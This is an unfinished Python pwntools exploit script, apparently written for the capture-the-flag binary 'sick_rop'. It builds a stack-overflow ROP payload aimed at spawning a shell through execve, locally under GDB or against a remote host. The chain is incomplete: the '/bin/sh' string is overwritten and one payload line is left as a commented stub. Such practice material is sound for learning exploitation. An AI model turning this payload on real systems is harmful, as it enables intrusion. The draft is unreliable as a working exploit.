#!/usr/bin/env python3

from pwn import *

def Main(ip=None, port=None):
    context.binary = "./sick_rop"

    if ip == None:
        proc = process()
        GDB(proc)
    else:
        proc = remote(ip, int(port))


    sys_execve = 0x3b

    read_gadget = 0x401000
    write_r10_gadget = 0x401046


    exploit = "/bin/sh"
    exploit = b"i" * cyclic_find(0x6161616b)
    exploit += p64(write_r10_gadget)
    # ~ exploit += p64(
    proc.write(exploit)

    proc.interactive()






def GDB(proc):

    sc = list()
    sc.append("break *vuln+32")
    sc.append("continue")
    sc.append("")

    sc = '\n'.join(sc)

    gdb.attach(proc, sc)


if __name__ == "__main__":
    argv = sys.argv

    if len(argv) > 2:
        Main(argv[1], argv[2])

    else:
        Main()
